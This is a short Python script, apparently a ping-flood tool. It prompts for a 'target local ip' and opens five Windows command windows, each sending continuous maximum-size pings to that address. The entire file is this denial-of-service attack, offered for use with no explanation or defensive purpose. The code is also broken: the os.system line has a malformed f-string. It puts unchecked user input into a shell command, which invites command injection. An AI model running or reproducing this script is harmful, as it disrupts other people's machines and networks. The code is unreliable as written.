import os
import time
ip = input('enter the target local ip')
command = 'ping {ip} -t -l 65500'
cmd = command.replace('{ip}',ip)
for i in range(5):
    os.system(f'start cmd /k '{cmd})
    time.sleep(0.2)
    
    
